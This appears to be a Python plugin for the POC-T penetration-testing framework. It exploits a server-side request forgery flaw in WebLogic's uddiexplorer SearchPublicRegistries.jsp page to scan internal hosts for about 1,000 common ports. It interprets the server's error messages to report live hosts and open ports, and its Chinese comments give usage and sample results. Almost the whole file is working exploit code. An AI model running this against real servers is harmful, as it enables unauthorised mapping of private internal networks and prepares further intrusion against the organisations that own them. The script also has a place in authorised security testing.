#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Weblogic SSRF 内网扫描脚本(nmap的1000个端口)

Usage:
  python POC-T.py -s weblogic-ssrf -iN 10.10.0.0/24

返回结果示例:
10.10.0.10:22/80/111
10.10.0.13:22/111/1521/5801/5901/6001
10.10.0.14:22/111/1521/10000
10.10.0.51:21/22/111/843/5801
10.10.0.18:13/21/22/23/25/37/513/514/1521/5989/9090/32768/32783

"""

import requests
from plugin.static import NMAP_PORTS_1000 as ports

base_uri = 'https://xxx.xxx.com'

def poc(ip_str):
    ans = []
    flag = False
    for port in ports:
        exp_url = base_uri.rstrip('/') + "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search" % (
            ip_str, port)
        try:
            # 根据情况设置timeout
            c = requests.get(exp_url, timeout=3, verify=False).content
            if 'weblogic.uddi.client.structures.exception.XML_SoapException' in c:
                if 'No route to host' in c:
                    # 主机不存在
                    return False
                elif 'Received a response' in c:
                    ans.append(port)
                    flag = True
                elif 'Response contained no data' in c:
                    ans.append(port)
                    flag = True
                elif 'but could not connect' in c:
                    # 主机存在但端口未开放
                    flag = True
        except Exception:
            pass
    if flag:
        return ip_str + ':' + str('/'.join(ans))
    return False

